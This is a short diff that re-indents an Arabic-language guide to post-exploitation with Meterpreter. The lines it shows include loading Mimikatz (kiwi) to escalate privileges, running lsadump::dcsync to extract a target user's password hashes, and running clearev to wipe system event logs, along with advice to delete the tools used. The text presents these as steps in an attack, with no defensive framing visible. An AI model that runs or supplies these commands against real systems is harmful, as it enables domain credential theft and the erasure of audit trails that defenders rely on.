@@ -15,7 +15,7 @@
   - بعد الحصول على الوصول الأساسي، يمكن استخدام Mimikatz لرفع الصلاحيات. 
   - يمكن تحميل Mimikatz في Meterpreter باستخدام الأمر:
 
-    meterpreter > load kiwi
+         meterpreter > load kiwi
 
 
  3. استخدام Mimikatz
@@ -23,7 +23,7 @@
 - استخراج كلمات المرور
   - بعد تحميل Mimikatz، يمكن استخدام الأوامر التالية لاستخراج كلمات المرور:
 
-    meterpreter > kiwi_cmd lsadump::dcsync /user:username
+        meterpreter > kiwi_cmd lsadump::dcsync /user:username
 
   - حيث يتم استبدال `username` باسم المستخدم المستهدف.
 
@@ -36,7 +36,7 @@
 - **حذف الملفات**: التأكد من إزالة أي أدوات تم استخدامها.
 - **مسح سجلات النظام**: استخدام الأمر:
 
-  meterpreter > clearev
+      meterpreter > clearev
 
   لمسح سجلات الأحداث.
 
